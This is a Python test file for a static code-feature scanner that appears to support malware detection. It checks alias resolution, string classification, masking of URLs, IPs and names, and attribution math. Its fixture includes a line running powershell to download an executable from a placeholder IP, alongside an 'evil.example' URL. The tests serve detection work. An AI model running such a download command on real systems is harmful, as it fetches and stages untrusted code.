import numpy as np

from tmcyberops.datasets import codefeatures as cf

SRC = """import os, base64 as b
from urllib.request import urlopen
x = b.b64decode("aGVsbG8=")
os.system("powershell -c iwr http://10.0.0.1/a.exe")
r = urlopen("https://example.org/x").read()
"""


def features(src: str) -> dict:
    occ = {}
    cf.scan(src, 0, occ)
    return occ


def test_scan_resolves_aliases_and_classifies_strings():
    occ = features(SRC)
    assert occ["call:base64.b64decode"] == [(0, 3)]  # `b` is base64
    assert occ["call:urllib.request.urlopen"] == [(0, 5)]  # bound by `from ... import`
    assert occ["call:os.system"] == [(0, 4)]
    assert occ["import:os"] == [(0, 1)]
    assert {"str:shell", "str:url", "str:ip", "str:executable"} <= set(occ)
    assert "name:read" not in occ  # the tail of a chain after a call is not a name


def test_scan_never_runs_code_and_survives_broken_files():
    occ = features("def f(:\n    exec('x')\n  bad indent\nos.system('ls')\n")
    assert "call:exec" in occ and "call:os.system" in occ  # regex fallback


def test_mask_hides_urls_ips_and_encoded_strings():
    m = cf.mask('u = "https://evil.example/p?q=1"; ip = "10.1.2.3:8080"; k = "' + "A" * 50 + '"')
    assert "evil" not in m and "10.1.2.3" not in m and "A" * 50 not in m
    assert "[URL]" in m and "[IP]" in m and "[ENCODED]" in m
    named = cf.mask("setup(author='Jan Kowalski', maintainer = \"A B\", author_email='x@y.org')")
    assert "Kowalski" not in named and "A B" not in named and "x@y.org" not in named


def test_line_heat_splits_each_attribution_over_its_occurrences():
    phi = np.array([0.6, -0.2, 0.3])
    occ = {"0": [(0, 1), (0, 4)], "1": [(1, 2)]}  # feature 2 is absent
    heat, absent = cf.line_heat(phi, occ, 2)
    assert heat[0] == {1: 0.3, 4: 0.3} and heat[1] == {2: -0.2}
    assert np.isclose(absent, 0.3)
    assert np.isclose(sum(v for f in heat for v in f.values()) + absent, phi.sum())


def test_select_uses_training_rows_only():
    present = [{"a", "b"}, {"a"}, {"b"}, {"c"}, {"c"}]
    y = np.array([1, 1, 0, 0, 1])
    train = np.array([True, True, True, False, False])
    assert cf.select(present, y, train, k=5, min_df=1) == ["a", "b"]  # c appears only after training
